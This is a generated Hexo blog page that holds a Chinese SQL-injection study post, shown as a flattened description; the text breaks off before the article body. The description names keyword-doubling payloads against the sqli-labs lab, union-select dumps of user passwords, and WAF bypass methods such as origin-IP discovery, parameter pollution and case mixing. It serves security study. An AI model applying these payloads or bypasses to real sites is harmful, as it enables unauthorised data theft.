@@ -1,0 +1,661 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL注入 | Ada</title><meta name="keywords" content="SQL注入,WAF"><meta name="author" content="adalucky"><meta name="copyright" content="adalucky"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL注入"><meta name="application-name" content="SQL注入"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入"><meta property="og:url" content="http://example.com/2021/08/04/worker/Tester/Security/SQL%E6%B3%A8%E5%85%A5/index.html"><meta property="og:site_name" content="Ada"><meta property="og:description" content="简介SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。    前置申明  本博客所有内容"><meta property="og:locale" content="en"><meta property="og:image" content="http://example.com/adaLogo.png"><meta property="article:author" content="adalucky"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/adaLogo.png"><meta name="description" content="简介SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。    前置申明  本博客所有内容"><link rel="shortcut icon" href="/adaLogo.png"><link rel="canonical" href="http://example.com/2021/08/04/worker/Tester/Security/SQL%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: adalucky","link":"Link: ","source":"Source: Ada","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Ada',
+  title: 'SQL注入',
+  postAI: 'true',
+  pageFillDescription: '简介, 介绍, 分类, 前置准备, 重置sqli-labs数据库, 调整php版本, 输出 sql 语句, 修改Less-1的请求方式, mysql中的注释, 注释符, 多行注释, 特殊注释, mysql中的换行, 练习, 白盒绕过, 执行 idx3D1, 执行 idx3D1’, 执行idx3D1’ orderby 1 –+, 尝试双写 oorrderby, 执行idx3D1’ and ‘1’x3D’1, 尝试双写 aandnd, 执行union select回显, 查看是否支持回显, union select 回显查询当前的库, 查看所有的库, 查看security库下的表, 查看users表有哪些字段, 查看security.users表下 usernamepassword 的值, 线上环境练习, 查看是都存在漏洞, order by查看有多少列, 查看可回显的字段, 黑盒绕过, 绕过的四大分类, 架构层面绕过waf, 寻找源网站绕过 waf 检测, 通过同网段绕过Waf防护, 资源限制角度绕过waf, post 传参, 尝试查看库名, 超大数据包-FIXME, 协议层面绕过waf, 协议未覆盖绕过waf, 参数污染, 规则层面的绕过waf, sql注释符绕过, 空白符绕过, 函数分割符号, 浮点数词法解释, 利用error- based进行sq注入, mysql特殊语法, 代码规则的waf, 练习-TODO简介注入是指应用程序对用户输入数据的合法性没有判断或过滤不严攻击者可以在应用程序中事先定义好的查询语句的结尾上添加额外的语句在管理员不知情的情况下实现非法操作以此来实现欺骗数据库服务器执行非授权的任意查询从而进一步得到相应的数据信息前置申明本博客所有内容均为作者的个人学习笔记记录作者也是小白一枚如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧本博客的所有大类下的文章只能作为学习研究使用不可用于非法测试和攻击请遵循网络安全法共筑和谐网络如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦如果你的网络如果能上就用浏览器订阅如果不能推荐用微软的浏览器目前正在寻找解决办法订阅成功后会有一条提示成功如果未收到表示网络限制原因未订阅成功中华人民共和国网络安全法年月日起施行第二十二条任何个人和组织不得从事入侵他人网络干扰他人网络正常功能窃取网络数据等危害网络安全的活动不得提供从事入侵网络干扰网络正常功能窃取网络数据等危害网络安全活动的工具和制作方法不得为他人实施危害网络安全的活动提供技术支持广告推广支付结算等帮助第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息不得出售或者非法向他人提供公民个人信息第六十三条违反本法规定给他人造成损害的依法承担民事责任第六十四条违反本法规定构成犯罪的依法追究刑事责任中华人民共和国刑法第二百八十五条违反国家规定侵入国家事务国防建设尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役第二百八十六条违反国家规定对计算机信息系统功能进行删除修改增加干扰造成计算机信息系统不能正常运行后果严重的处五年以下有期徒刑或者拘役后果特别严重的处五年以上有期徒刑违反国家规定对计算机信息系统中存储处理或者传输的数据和应用程序进行删除修改增加的操作后果严重的依照前款的规定处罚中华人民共和国刑法修正案第九条在刑法第二百八十五条中增加两款作为第二款第三款违反国家规定侵入前款规定以外的计算机信息系统或者采用其他技术手段获取该计算机信息系统中存储处理或者传输的数据或者对该计算机信息系统实施非法控制情节严重的处三年以下有期徒刑或者拘役并处或者单处罚金情节特别严重的处三年以上七年以下有期徒刑并处罚金提供专门用于侵入非法控制计算机信息系统的程序或者明知他人实施侵入非法控制计算机信息系统的违法犯罪行为而为其提供程序工具情节严依照前款的规定处罚介绍分类注入大致分为类分别为白盒绕过黑盒绕过测试前置准备说明此次练习的环境是基于下用搭建的靶场以关卡进行演示重置数据库我这边是因为之前做用工具对靶场进行了安全扫描怕有一些干扰因此先重置一下防止出问题如果是第一次部署需要将文件中的数据库密码进行配置大概是在第五行你的数据库密码重置数据库时候需要将版本需要选择调整版本在进行注入的时候版本需要选择如果低于这个版本会出现一些错误也就是上面改成低版本这里又要改改回了输出语句为了方便展示我们需要在执行注入的时候查看一下我们的执行语句因此在对应的关卡中加入输入语法如下如果是启动的那么该文件在修改前最好备份修改的请求方式将关卡中中默认的请求替换为这样可以同时支持和方便练习中的注释注释符不带注释通过注释符号号注释通过减减空格注释多行注释这是的多行注释只要注释体内就不会影响外面的特殊注释其实这里我也有点蒙看了一些资料说的是数字小于的版本就会执行但是这个第二条又没有执行出来所以还是不要卡太死这个是的一个特性根据版本号有关中的换行用进行测试的时候换行符号用表示练习白盒绕过通过源代码分析来进行绕过例当前用的腾讯云上安装的并未安装安全狗防护执行通过执行显示正常执行此时报错说明存在漏洞执行使用语句发现报错无法使用观察打印出来的原因是过滤了尝试双写返回正常并且能判断有列执行尝试双写执行回显查看是否支持回显支持回显回显查询当前的库查询当前的库查看所有的库拼接函数拼接括号里面的那个字段查询所有的库把所有的结果拼接起来要双写因为上面测试发现被过滤掉了查看库下的表通过上面我们已经知道了当前的库名为那么可以对其查询下面的表有哪些要双写因为上面测试发现被过滤掉了为进制编码后的为编码后的值查看表有哪些字段和要双写因为上面测试发现都被过滤掉了查看表下的值查看表下的值要双写要双写因为上面测试发现被过滤掉了是号通过进制编码后的结果函数是拼接字段的函数线上环境练习查看是都存在漏洞返回正常报错说明存在注入查看有多少列查看可回显的字段下面就可以进行其它的操作了更多参考黑盒绕过绕过的四大分类架构层面绕过资源限制角度绕过协议层面绕过规则层面的绕过架构层面绕过寻找源网站绕过检测主要针对的是云找到源网站的真实地址进行绕过有点像发邮件注册账户或者遇到一些异常是通过邮件查看是否为真实服务器的超级对于某些偏远用户访问量小的可能提供的服务是从真实服务器进行处理海外服务通过代理海外的去访问服务如果企业没有海外云可能就会提供真实的服务器进行处理文件获取云中的小图标计算值通过查找值如果有相同的那么另外一台或几台可能就是真实服务器的或者也有可能是另外一些云通过同网段绕过防护在一个网段中可能经过的数据不会经过云从而实现绕过这里就需要能难到同网段的机器或者通过同网段的进行转发资源限制角度绕过一般的执行需要优先考虑业务优先的原则所以对于构造较大超大数据包可能不会进行检测从而实现绕过方法提交的数据大小长度并没有限制协议规范没有对长度进行限制这个限制是特定的浏览器及服务器对它的限制如对长度的限制是字节最大长度限制为个字符理论上讲是没有大小限制的协议规范也没有进行大小限制起限制作用的是服务器的处理程序的处理能力如在下取消大小的限制默认传参请求地址体尝试查看库名请求的体超大数据包超大数据包内容协议层面绕过协议未覆盖绕过比如由于业务需要只对型进行检测数据选择忽略宝塔就是这个典型那么对于那些既可以发起又能通过的就可以开始挑战了参数污染可能只对进行检测这个策略主要也是针对宝塔执行此语句提示触发宝塔参数污染通过加上多个重复的参数去干扰规则层面的绕过注释符绕过空白符绕过对关键字监测的地方尝试用空白符隔开函数分割符号将一个函数进行分割其实就是百分号就是空白符浮点数词法解释对于可以进行检测但是对于可能就无法检测利用进行注入报错注入现在的时效性并不好了基本上都能被拦截了特殊语法代码规则的大小写绕过如果对关键字等进行了过滤可以考虑使用大小写混合的方法但是很多时候有函数会部分大小写进行过滤这个时候我们可以考虑使用双写的方法关键字重复关键字替换如果还是无法绕过可以考虑替换的方法可以替换等价于练习拦截正常正常正常拦截正常拦截拦截',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2026-06-01 12:59:18',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 8.1.2"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Ada</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/archives/"><span> 总览</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/tags/"><span> 标签</span></a></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="Random Post" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="Console" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/wechat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/wechat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">Interaction</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">Interests</div><span class="author-content-item-title">Find your area of interest</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Axios/" style="font-size: 1.05rem;">Axios<sup>1</sup></a><a href="/tags/Centos/" style="font-size: 1.05rem;">Centos<sup>1</sup></a><a href="/tags/Docker/" style="font-size: 1.05rem;">Docker<sup>2</sup></a><a href="/tags/ES6/" style="font-size: 1.05rem;">ES6<sup>1</sup></a><a href="/tags/ESP-IDF/" style="font-size: 1.05rem;">ESP-IDF<sup>1</sup></a><a href="/tags/Gradle/" style="font-size: 1.05rem;">Gradle<sup>1</sup></a><a href="/tags/Hexo/" style="font-size: 1.05rem;">Hexo<sup>3</sup></a><a href="/tags/JDK17/" style="font-size: 1.05rem;">JDK17<sup>1</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>3</sup></a><a href="/tags/Kafka/" style="font-size: 1.05rem;">Kafka<sup>1</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>1</sup></a><a href="/tags/MQ/" style="font-size: 1.05rem;">MQ<sup>1</sup></a><a href="/tags/MongoDB/" style="font-size: 1.05rem;">MongoDB<sup>1</sup></a><a href="/tags/NPM/" style="font-size: 1.05rem;">NPM<sup>1</sup></a><a href="/tags/NeoVim/" style="font-size: 1.05rem;">NeoVim<sup>1</sup></a><a href="/tags/Nginx/" style="font-size: 1.05rem;">Nginx<sup>2</sup></a><a href="/tags/OSS/" style="font-size: 1.05rem;">OSS<sup>1</sup></a><a href="/tags/Obsidian/" style="font-size: 1.05rem;">Obsidian<sup>1</sup></a><a href="/tags/SpringBoot/" style="font-size: 1.05rem;">SpringBoot<sup>3</sup></a><a href="/tags/TS/" style="font-size: 1.05rem;">TS<sup>3</sup></a><a href="/tags/Tag-Plugins/" style="font-size: 1.05rem;">Tag Plugins<sup>1</sup></a><a href="/tags/Tmux/" style="font-size: 1.05rem;">Tmux<sup>1</sup></a><a href="/tags/Vite/" style="font-size: 1.05rem;">Vite<sup>1</sup></a><a href="/tags/Vue3/" style="font-size: 1.05rem;">Vue3<sup>1</sup></a><a href="/tags/Webpack/" style="font-size: 1.05rem;">Webpack<sup>1</sup></a><a href="/tags/Yarn/" style="font-size: 1.05rem;">Yarn<sup>1</sup></a><a href="/tags/asdf/" style="font-size: 1.05rem;">asdf<sup>1</sup></a><a href="/tags/css/" style="font-size: 1.05rem;">css<sup>1</sup></a><a href="/tags/eslint/" style="font-size: 1.05rem;">eslint<sup>1</sup></a><a href="/tags/html/" style="font-size: 1.05rem;">html<sup>1</sup></a><a href="/tags/jenkins/" style="font-size: 1.05rem;">jenkins<sup>1</sup></a><a href="/tags/pinia/" style="font-size: 1.05rem;">pinia<sup>1</sup></a><a href="/tags/setting/" style="font-size: 1.05rem;">setting<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">前端基础<sup>6</sup></a><a href="/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 1.05rem;">小程序<sup>1</sup></a><a href="/tags/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">微信开发者工具<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>1</sup></a><a href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" style="font-size: 1.05rem;">消息队列<sup>1</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/" style="font-size: 1.05rem;">环境管理<sup>1</sup></a><a href="/tags/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B/" style="font-size: 1.05rem;">非关系型<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>Articles</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span><a class="card-more-btn" href="/archives/" title="More">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/06/"><span class="card-archive-list-date">June 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">August 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">July 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">June 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">May 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/08/"><span class="card-archive-list-date">August 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/06/"><span class="card-archive-list-date">June 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/05/"><span class="card-archive-list-date">May 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="Toggle Display Mode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="Toggle Sidebar"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="Toggle"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Security/" itemprop="url">Security</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>SQL注入</span></a><a class="article-meta__tags" href="/tags/WAF/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>WAF</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2021-08-04T19:55:00.000Z" title="Created 2021-08-04 19:55:00">2021-08-04</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-06-01T12:59:18.036Z" title="Updated 2026-06-01 12:59:18">2026-06-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">Post View:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为成都"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>成都</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">AnZhiYu GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2021/08/04/worker/Tester/Security/SQL%E6%B3%A8%E5%85%A5/"><header><a class="post-meta-categories" href="/categories/Security/" itemprop="url">Security</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url">SQL注入</a><a href="/tags/WAF/" tabindex="-1" itemprop="url">WAF</a><h1 id="CrawlerTitle" itemprop="name headline">SQL注入</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">adalucky</span><time itemprop="dateCreated datePublished" datetime="2021-08-04T19:55:00.000Z" title="Created 2021-08-04 19:55:00">2021-08-04</time><time itemprop="dateCreated datePublished" 